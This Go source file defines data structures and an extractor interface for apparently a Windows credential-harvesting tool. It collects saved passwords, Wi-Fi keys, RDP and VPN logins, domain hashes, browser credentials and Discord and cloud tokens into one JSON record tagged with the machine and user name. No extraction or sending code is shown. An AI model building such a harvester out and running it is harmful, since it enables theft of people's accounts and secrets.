package credentials

import (
	"os"
	"time"
)

// Common credential structures shared across all extractors

// Credential structure for Windows Credential Manager
type Credential struct {
	Type        string `json:"type"`
	TargetName  string `json:"target_name"`
	Comment     string `json:"comment,omitempty"`
	UserName    string `json:"username,omitempty"`
	Password    string `json:"password,omitempty"`
	LastWritten string `json:"last_written,omitempty"`
	Persist     string `json:"persist,omitempty"`
}

// WiFi Profile structure
type WiFiProfile struct {
	SSID           string `json:"ssid"`
	Authentication string `json:"authentication"`
	Encryption     string `json:"encryption"`
	Password       string `json:"password,omitempty"`
	KeyMaterial    string `json:"key_material,omitempty"`
}

// RDP Connection structure
type RDPConnection struct {
	Server   string `json:"server"`
	Username string `json:"username,omitempty"`
	Password string `json:"password,omitempty"`
	Domain   string `json:"domain,omitempty"`
	Port     string `json:"port,omitempty"`
}

// Domain Credential structure
type DomainCredential struct {
	Domain       string `json:"domain"`
	Username     string `json:"username"`
	Password     string `json:"password,omitempty"`
	LastLogon    string `json:"last_logon,omitempty"`
	CacheType    string `json:"cache_type"`
	PasswordHash string `json:"password_hash,omitempty"`
}

// Application Credential structure for various apps
type AppCredential struct {
	Application string            `json:"application"`
	AccountName string            `json:"account_name,omitempty"`
	Username    string            `json:"username,omitempty"`
	Password    string            `json:"password,omitempty"`
	Token       string            `json:"token,omitempty"`
	Email       string            `json:"email,omitempty"`
	Server      string            `json:"server,omitempty"`
	Port        string            `json:"port,omitempty"`
	Protocol    string            `json:"protocol,omitempty"`
	Extra       map[string]string `json:"extra,omitempty"`
}

// VPN Credential structure
type VPNCredential struct {
	Name         string `json:"name"`
	Server       string `json:"server"`
	Username     string `json:"username,omitempty"`
	Password     string `json:"password,omitempty"`
	PreSharedKey string `json:"pre_shared_key,omitempty"`
	Certificate  string `json:"certificate,omitempty"`
	VPNType      string `json:"vpn_type"`
}

// Browser Credential structure (separate from cookies)
type BrowserCredential struct {
	Browser  string `json:"browser"`
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
	Realm    string `json:"realm,omitempty"`
}

// UnifiedCredentials structure to hold all credential types in a single JSON
type UnifiedCredentials struct {
	Metadata struct {
		ExtractedAt   string `json:"extracted_at"`
		ComputerName  string `json:"computer_name"`
		Username      string `json:"username"`
		TotalCount    int    `json:"total_count"`
	} `json:"metadata"`
	CredentialManager  []Credential        `json:"credential_manager,omitempty"`
	RDPConnections     []RDPConnection     `json:"rdp_connections,omitempty"`
	WiFiProfiles       []WiFiProfile       `json:"wifi_profiles,omitempty"`
	DomainCredentials  []DomainCredential  `json:"domain_credentials,omitempty"`
	Applications       []AppCredential     `json:"applications,omitempty"`
	VPNCredentials     []VPNCredential     `json:"vpn_credentials,omitempty"`
	BrowserCredentials []BrowserCredential `json:"browser_credentials,omitempty"`
	OutlookCredentials []AppCredential     `json:"outlook_credentials,omitempty"`
	DiscordTokens      []AppCredential     `json:"discord_tokens,omitempty"`
	CloudCredentials   []AppCredential     `json:"cloud_credentials,omitempty"`
}

// Extractor interface that all credential extractors must implement
type Extractor interface {
	Extract() (interface{}, error)
	GetType() string
}

// Helper function to create unified credentials with metadata
func NewUnifiedCredentials() *UnifiedCredentials {
	unified := &UnifiedCredentials{}
	unified.Metadata.ExtractedAt = time.Now().Format(time.RFC3339)
	
	// Get computer name and username from environment
	if computerName := getEnvOrDefault("COMPUTERNAME", "unknown"); computerName != "" {
		unified.Metadata.ComputerName = computerName
	}
	if username := getEnvOrDefault("USERNAME", "unknown"); username != "" {
		unified.Metadata.Username = username
	}
	
	return unified
}

func getEnvOrDefault(key, defaultValue string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return defaultValue
}
